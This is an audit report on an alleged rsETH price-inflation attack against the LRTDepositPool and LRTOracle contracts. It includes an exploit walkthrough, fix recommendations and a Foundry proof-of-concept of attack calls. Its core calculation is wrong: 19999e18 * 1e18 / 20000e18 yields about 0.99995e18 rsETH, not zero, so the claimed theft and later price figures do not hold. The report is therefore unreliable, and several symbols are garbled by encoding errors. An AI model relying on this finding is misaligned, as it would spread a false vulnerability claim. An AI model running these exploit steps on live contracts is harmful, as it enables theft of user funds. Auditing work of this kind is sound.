Audit Report

## Title
rsETH Price Inflation via ETH Donation to `LRTDepositPool` Causes Victim Deposits to Yield Zero rsETH ÔÇö (File: contracts/LRTDepositPool.sol / contracts/LRTOracle.sol)

## Summary
`LRTDepositPool.getETHDistributionData()` uses raw `address(this).balance`, and the contract has an unrestricted `receive()` fallback, allowing any caller to inflate the protocol's reported TVL by sending ETH directly. Because `updateRSETHPrice()` is public and `pricePercentageLimit` defaults to zero (no cap on price jumps), an attacker can commit an arbitrarily inflated `rsETHPrice` in a single call. Since `getRsETHAmountToMint` divides by the stored price and `_beforeDeposit` has no zero-rsETH guard, a victim depositing at the inflated price receives zero rsETH while their ETH is permanently absorbed into the pool, which the attacker then redeems at the inflated price.

## Finding Description

**Root cause 1 ÔÇö TVL accounting uses raw `address(this).balance`.**

`LRTDepositPool.getETHDistributionData()` sets:
```solidity
ethLyingInDepositPool = address(this).balance;  // LRTDepositPool.sol L480
```
The contract accepts arbitrary ETH via its open fallback:
```solidity
receive() external payable { }  // LRTDepositPool.sol L58
```
Any ETH sent directly is silently included in `totalETHInProtocol` computed by `LRTOracle._getTotalEthInProtocol()`.

**Root cause 2 ÔÇö `updateRSETHPrice()` is public with no price-jump cap when `pricePercentageLimit == 0`.**

```solidity
function updateRSETHPrice() public whenNotPaused {   // LRTOracle.sol L87-89
    _updateRsETHPrice();
}
```
Inside `_updateRsETHPrice()`, the guard is:
```solidity
bool isPriceIncreaseOffLimit =
    pricePercentageLimit > 0 && priceDifference > pricePercentageLimit.mulWad(highestRsethPrice);
// LRTOracle.sol L256-257
```
`pricePercentageLimit` is never set in `initialize()`, so it starts at `0`. The short-circuit `pricePercentageLimit > 0` makes `isPriceIncreaseOffLimit` permanently `false`, allowing an unbounded single-step price jump.

**Root cause 3 ÔÇö Minting divides by the stored (stale/inflated) price with no zero-output guard.**

```solidity
rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
// LRTDepositPool.sol L520
```
`_beforeDeposit` only checks `rsethAmountToMint < minRSETHAmountExpected`; when `minRSETHAmountExpected == 0` (the default), a result of `0` passes the check and `_mintRsETH(0)` is called, which succeeds (OpenZeppelin `_mint` with amount 0 is a no-op, and `checkDailyMintLimit(0)` does not revert when `maxMintAmountPerDay == 0`).

**Exploit flow:**

1. Attacker deposits `1 ETH` ÔåÆ receives `1e18` rsETH at price `1e18`.
2. Attacker sends `19999 ETH` directly to `LRTDepositPool` via `receive()`. `address(this).balance = 20000e18`.
3. Attacker calls `updateRSETHPrice()`. `rsethSupply = 1e18`, `totalETHInProtocol = 20000e18`, `newRsETHPrice Ôëê 20000e18`. No revert because `pricePercentageLimit == 0`.
4. Victim calls `depositETH{value: 19999 ether}(0, "")`. `rsethAmountToMint = 19999e18 * 1e18 / 20000e18 = 0`. Victim receives `0` rsETH; their `19999 ETH` is now in the pool.
5. Attacker calls `updateRSETHPrice()` again. `rsethSupply Ôëê 1e18`, `totalETHInProtocol Ôëê 39999e18`, `rsETHPrice Ôëê 39999e18`.
6. Attacker calls `initiateWithdrawal(ETH, 1e18, "")`. `getExpectedAssetAmount` returns `1e18 * 39999e18 / 1e18 = 39999e18`. `getAvailableAssetAmount` returns `39999e18` (pool balance). Check passes; withdrawal queued for `39999 ETH`.
7. Operator performs normal queue processing (transfers ETH to `LRTUnstakingVault`, calls `unlockQueue`). `_calculatePayoutAmount` returns `min(39999e18, 39999e18) = 39999e18`.
8. Attacker calls `completeWithdrawal` after delay, receives `39999 ETH`.

**Net result:** Attacker spent `20000 ETH`, recovered `39999 ETH`. Victim deposited `19999 ETH`, received `0` rsETH ÔÇö funds are permanently unrecoverable without rsETH to burn.

**Existing guards that fail:**
- `minRSETHAmountExpected` slippage guard: only protects users who pass a non-zero value; the parameter defaults to `0` in all documented examples and many integrations.
- `pricePercentageLimit` guard: entirely bypassed when `pricePercentageLimit == 0` (the default post-`initialize()`).
- `checkDailyMintLimit(0)`: does not revert for a zero-amount mint.

## Impact Explanation

**Critical ÔÇö Direct theft of user funds.**

The victim's entire deposit (`19999 ETH` in the concrete example) is permanently absorbed into the pool with no rsETH issued in return. The attacker redeems the victim's ETH plus their own original deposit at the inflated price. The victim has no recourse: without rsETH they cannot initiate a withdrawal. This matches the allowed impact class "Direct theft of any user funds, whether at-rest or in-motion."

## Likelihood Explanation

All preconditions are satisfied by default at protocol launch:
- `pricePercentageLimit` is `0` (not set in `initialize()`), so no per-call cap exists.
- `updateRSETHPrice()` is callable by any EOA with no role restriction.
- `LRTDepositPool.receive()` accepts ETH from any sender.
- The attack is most profitable at low TVL (protocol launch), exactly when `pricePercentageLimit` is most likely to be unset.
- The only partial mitigation (`minRSETHAmountExpected`) is opt-in and commonly set to `0`.

The attack requires capital (`20000 ETH` in the example) but is fully permissionless, atomic up to the withdrawal delay, and repeatable.

## Recommendation

1. **Replace `address(this).balance` with a tracked deposit variable.** Introduce a storage variable (e.g., `ethDeposited`) incremented only through legitimate deposit paths (`depositETH`, `receiveFromNodeDelegator`, etc.) and use it in `getETHDistributionData()` instead of `address(this).balance`.

2. **Set a non-zero `pricePercentageLimit` in `initialize()`.** A default of `1e16` (1%) ensures a single `updateRSETHPrice()` call cannot cause a catastrophic price jump even if a donation slips through.

3. **Add a zero-rsETH guard in `_beforeDeposit()`.** Revert if `rsethAmountToMint == 0` regardless of `minRSETHAmountExpected`:
   ```solidity
   if (rsethAmountToMint == 0) revert ZeroRsETHMinted();
   ```

4. **Restrict `updateRSETHPrice()` to trusted callers** (e.g., `onlyLRTManager`) or add a per-call cooldown to prevent rapid sequential price commits.

## Proof of Concept

Foundry fork test outline (all steps executable in a single test function on a mainnet fork at low TVL):

```solidity
// 1. Attacker deposits 1 ETH ÔåÆ receives 1e18 rsETH
depositPool.depositETH{value: 1 ether}(0, "");

// 2. Attacker donates 19999 ETH directly
(bool ok,) = address(depositPool).call{value: 19999 ether}("");
require(ok);

// 3. Commit inflated price (rsETHPrice Ôëê 20000e18, pricePercentageLimit == 0 ÔåÆ no revert)
oracle.updateRSETHPrice();
assertApproxEqAbs(oracle.rsETHPrice(), 20000e18, 1e18);

// 4. Victim deposits 19999 ETH with minRSETHAmountExpected = 0
vm.prank(victim);
depositPool.depositETH{value: 19999 ether}(0, "");
assertEq(rsETH.balanceOf(victim), 0); // victim receives 0 rsETH

// 5. Commit victim's ETH into price
oracle.updateRSETHPrice();
assertApproxEqAbs(oracle.rsETHPrice(), 39999e18, 1e18);

// 6. Attacker initiates withdrawal of 1e18 rsETH ÔåÆ expects ~39999 ETH
rsETH.approve(address(withdrawalManager), 1e18);
withdrawalManager.initiateWithdrawal(ETH, 1e18, "");

// 7. Operator moves ETH to unstaking vault and unlocks queue (normal operation)
// transferETHToLRTUnstakingVault / unlockQueue called by operator

// 8. After delay, attacker completes withdrawal
vm.roll(block.number + withdrawalDelayBlocks);
withdrawalManager.completeWithdrawal(ETH, "");
assertApproxEqAbs(attacker.balance, initialBalance + 19999 ether, 1e18); // net profit = victim's ETH
```
